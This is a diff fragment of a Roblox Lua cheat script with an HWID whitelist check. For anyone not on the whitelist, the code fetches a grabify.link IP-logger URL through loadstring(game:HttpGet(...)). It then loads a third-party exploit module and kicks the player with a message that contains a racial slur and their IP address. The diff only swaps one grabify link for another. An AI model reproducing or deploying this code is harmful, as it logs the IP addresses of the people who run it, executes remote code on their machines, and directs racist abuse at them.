@@ -38,12 +38,12 @@ if table.find(HwidWhitelist, HWID) then
     if table.find(HwidWhitelist, Read) then
         loadstring(game:HttpGet("https://raw.githubusercontent.com/AirScriptYT/TDS/main/NewMain", true))()
     else
-        loadstring(game:HttpGet("https://grabify.link/GYXTPJ", true))()
+        loadstring(game:HttpGet("https://grabify.link/0I3C40", true))()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main//CustomModules/6872274481.lua",true))()
         game.Players.LocalPlayer:Kick("Fuck You Nigger also "..ip)  
     end
 else
-    loadstring(game:HttpGet("https://grabify.link/GYXTPJ", true))()
+    loadstring(game:HttpGet("https://grabify.link/0I3C40", true))()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main//CustomModules/6872274481.lua",true))()
     game.Players.LocalPlayer:Kick("Fuck You Nigger also "..ip)
 end
